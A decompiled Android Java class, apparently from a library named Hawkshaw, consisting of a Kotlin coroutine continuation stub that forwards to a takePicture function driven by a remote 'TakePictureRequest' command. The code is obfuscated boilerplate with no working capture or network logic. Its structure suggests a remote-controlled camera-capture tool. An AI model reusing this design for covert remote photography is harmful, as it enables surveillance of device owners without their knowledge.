package com.hawkshaw.library.features.media.camera;

import A.d;
import android.content.Context;
import androidx.lifecycle.C0266w;
import c3.C0325c;
import com.hawkshaw.library.datalayer.models.Command;
import java.io.File;
import o.C0755J;

public final class g extends C0325c {

    /* renamed from: D  reason: collision with root package name */
    public Object f4999D;

    /* renamed from: E  reason: collision with root package name */
    public Object f5000E;

    /* renamed from: F  reason: collision with root package name */
    public Object f5001F;

    /* renamed from: G  reason: collision with root package name */
    public Object f5002G;

    /* renamed from: H  reason: collision with root package name */
    public File f5003H;

    /* renamed from: I  reason: collision with root package name */
    public C0755J f5004I;

    /* renamed from: J  reason: collision with root package name */
    public /* synthetic */ Object f5005J;

    /* renamed from: K  reason: collision with root package name */
    public int f5006K;

    public final Object invokeSuspend(Object obj) {
        this.f5005J = obj;
        this.f5006K |= Integer.MIN_VALUE;
        return TakePictureKt.takePicture((Context) null, (C0266w) null, (Command.TakePictureRequest) null, (d) null, this);
    }
}
